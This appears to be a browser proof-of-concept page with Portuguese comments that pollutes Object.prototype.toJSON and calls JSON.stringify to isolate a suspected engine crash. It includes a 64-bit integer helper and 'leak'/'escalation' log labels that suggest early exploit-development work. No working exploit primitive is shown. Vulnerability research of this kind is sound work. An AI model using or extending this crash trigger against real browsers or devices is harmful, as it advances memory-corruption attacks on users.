<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3b - Investigando 'this' em JSON.stringify</title>
    <style>
        /* ... (estilos como antes) ... */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output {
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            height: 80vh;
            overflow-y: auto;
            white-space: pre-wrap;
            margin-top: 10px;
        }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>PoC Isolado v2.3b - Investigando 'this'</h1>
    <p>Este script tenta identificar qual 'this' causa o problema.</p>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3b</button>
    <div id="output"></div>

    <script>
        // --- Utilitários e Constantes Globais ---
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */
            constructor(low, high) {
                let buffer = new Uint32Array(2);
                let bytes = new Uint8Array(buffer.buffer);
                if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
                if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); }
                let is_one = false;
                if (arguments.length === 1) { is_one = true; }
                if (!is_one) {
                    if (typeof (low) !== 'number' && typeof (high) !== 'number') {
                        throw TypeError('low/high must be numbers');
                    }
                }
                const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff);
                if (typeof low === 'number') {
                    if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); }
                    if (is_one) {
                        high = 0;
                        if (low < 0) { high = -1; }
                    } else {
                        if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); }
                    }
                    buffer[0] = low;
                    buffer[1] = high;
                } else if (typeof low === 'string') {
                    let hexstr = low;
                    if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
                    if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; }
                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); }
                    else { hexstr = hexstr.padStart(16, '0');}
                    for (let i = 0; i < 8; i++) {
                        bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16);
                    }
                } else if (typeof low === 'object') {
                    if (low instanceof AdvancedInt64) {
                        bytes.set(low.bytes);
                    } else if (low.length === 8) {
                        bytes.set(low);
                    } else { throw TypeError("Array must have exactly 8 elements."); }
                } else {
                    throw TypeError('AdvancedInt64 does not support your object for conversion');
                }
                this.buffer = buffer;
                this.bytes = bytes;
            }
            low() { return this.buffer[0]; }
            high() { return this.buffer[1]; }
            toString(is_pretty) {
                let lowStr = this.low().toString(16).padStart(8, '0');
                let highStr = this.high().toString(16).padStart(8, '0');
                if (is_pretty) {
                    highStr = highStr.substring(0, 4) + '_' + highStr.substring(4);
                    lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4);
                    return '0x' + highStr + '_' + lowStr;
                }
                return '0x' + highStr + lowStr;
            }
        }

        const generalUtils = {
            logToDiv: (divId, message, type = 'info', funcName = '') => {
                const outputDiv = document.getElementById(divId);
                if (!outputDiv) return;
                try {
                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
                    const prefix = funcName ? `[${funcName}] ` : '';
                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                    if(outputDiv.innerHTML.length > 300000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 150000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
                    outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                    outputDiv.scrollTop = outputDiv.scrollHeight;
                } catch(e) { console.error(`Erro no log para ${divId}:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
            }
        };


        // --- Script Isolado v2.3b ---
        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const MEDIUM_PAUSE_S1 = 200;
        let callCount_toJSON = 0; // Contador para chamadas toJSON

        const logS1 = (message, type = 'info', funcName = '') => {
            generalUtils.logToDiv('output', message, type, funcName);
        };
        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));

        // Objeto de teste original que causa o crash
        const originalTestObject = { a: 1, b: 'test_data', c: { nested: true, d: "deep_val" } };
        let currentThisForAnalysis = null; // Para tentar "salvar" o this problemático

        const testPPJsonHijack_v23b = async () => {
            const FNAME = 'testPPJsonHijack_v23b';
            logS1("--- Iniciando Teste v2.3b: Investigação de 'this' ---", 'test', FNAME);
            
            const ppKey = 'toJSON'; 
            let originalToJSON_Descriptor;
            let ppAppliedSuccessfully = false;
            callCount_toJSON = 0;
            currentThisForAnalysis = null;

            try {
                originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

                Object.prototype[ppKey] = function() {
                    callCount_toJSON++;
                    let logPrefix = `toJSON PoC v2.3b (Chamada ${callCount_toJSON})`;
                    
                    // Tenta capturar 'this' ANTES de qualquer operação arriscada
                    currentThisForAnalysis = this; // Salva a referência a 'this'

                    let thisInfoString = `${logPrefix} - typeof this: ${typeof this}`;
                    if (this === null) {
                        thisInfoString += ", 'this' é null.";
                    } else if (typeof this === 'object') {
                        thisInfoString += `, constructor: ${this.constructor ? this.constructor.name : 'N/A'}`;
                        if (this === originalTestObject) thisInfoString += " (É o originalTestObject RAÍZ)";
                        else if (this === originalTestObject.c) thisInfoString += " (É o originalTestObject.c ANINHADO)";
                    } else {
                        thisInfoString += `, valor primitivo: ${String(this)}`;
                    }
                    logS1(thisInfoString, 'critical', FNAME); // Log crítico para tentar ver antes do crash

                    // Estratégia: Para as primeiras X chamadas, não fazer Object.keys(this)
                    // e sim retornar algo simples para deixar o JSON.stringify prosseguir.
                    // A ideia é que o `this` problemático pode não ser o primeiro a ser processado.
                    if (callCount_toJSON < 3) { // Tente aumentar este número (ex: 3, 4, 5)
                        logS1(`${logPrefix} - Chamada ${callCount_toJSON} < 3. Retornando valor simples para deixar prosseguir.`, 'warn', FNAME);
                        // Retorna um valor que não envolva Object.keys(this) imediatamente
                        return { simple_pass_through: true, call_count: callCount_toJSON, type_of_this: typeof this };
                    } else {
                        // A partir da chamada X, tentamos a lógica que acreditamos causar o crash
                        logS1(`${logPrefix} - Chamada ${callCount_toJSON} >= 3. Tentando Object.keys(this) AGORA.`, 'vuln', FNAME);
                        let keys = [];
                        try {
                            keys = Object.keys(this); // PONTO CRÍTICO
                            logS1(`${logPrefix} - Object.keys(this) bem sucedido. Chaves: [${keys.join(', ')}]`, 'good', FNAME);
                            return { "toJSON_called_successfully_critical_path": true, "object_keys": keys, "call_count": callCount_toJSON }; 
                        } catch (e) {
                            logS1(`${logPrefix} - ERRO CRÍTICO em Object.keys(this): ${e.message}. Stack: ${e.stack ? e.stack : 'N/A'}`, 'error', FNAME);
                            // Se o crash for aqui, este log pode não aparecer.
                            return { "toJSON_error_getting_keys_critical_path": true, "error_message": String(e.message), "call_count": callCount_toJSON };
                        }
                    }
                };
                ppAppliedSuccessfully = true;
                logS1(`Poluição Object.prototype.${ppKey} aplicada.`, 'info', FNAME);

                logS1(`Tentando JSON.stringify com originalTestObject...`, 'info', FNAME);
                await PAUSE_S1_FUNC(50); // Pequena pausa para logs anteriores aparecerem
                const result = JSON.stringify(originalTestObject); 
                
                logS1(`Resultado de JSON.stringify: ${result ? result.substring(0, 500) : "N/A"}`, 'info', FNAME);

            } catch (e) {
                logS1(`Erro fatal capturado em testPPJsonHijack_v23b: ${e.message}`, 'error', FNAME);
                if (e.stack) logS1(`Stack do erro: ${e.stack}`, 'error', FNAME);
                console.error("JSON.stringify Crash Test Error (v2.3b):", e);
                logS1("CRASH PROVAVELMENTE OCORREU. Verifique o console.", 'critical', FNAME);
            } finally {
                if (ppAppliedSuccessfully) { 
                    if (originalToJSON_Descriptor) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
                    } else {
                        delete Object.prototype[ppKey];
                    }
                    logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup');
                }
                // Tenta logar o último 'this' capturado se não houve crash antes
                 if (currentThisForAnalysis) {
                    logS1(`Último 'this' capturado (callCount ${callCount_toJSON}): typeof=${typeof currentThisForAnalysis}, constructor=${currentThisForAnalysis && currentThisForAnalysis.constructor ? currentThisForAnalysis.constructor.name : 'N/A'}`, 'leak', FNAME);
                    if (currentThisForAnalysis === originalTestObject) logS1(" -> Era o originalTestObject RAÍZ", 'leak', FNAME);
                    else if (currentThisForAnalysis === originalTestObject.c) logS1(" -> Era o originalTestObject.c ANINHADO", 'leak', FNAME);
                }
            }
            logS1(`--- Teste JSON.stringify v2.3b Concluído ---`, 'test', FNAME);
        };

        const runIsolatedTest = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDivS1.innerHTML = '';
            callCount_toJSON = 0;
            currentThisForAnalysis = null;
            logS1("==== INICIANDO PoC Isolado v2.3b (Investigando 'this') ====", 'test', 'runIsolatedTest');
            
            // Decidimos que simulateOOBLeakAndStoreS1 não é essencial para este crash específico
            // await simulateOOBLeakAndStoreS1(); 
            // await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            
            await testPPJsonHijack_v23b();
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);

            logS1("\n==== PoC Isolado v2.3b CONCLUÍDO ====", 'test', 'runIsolatedTest');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
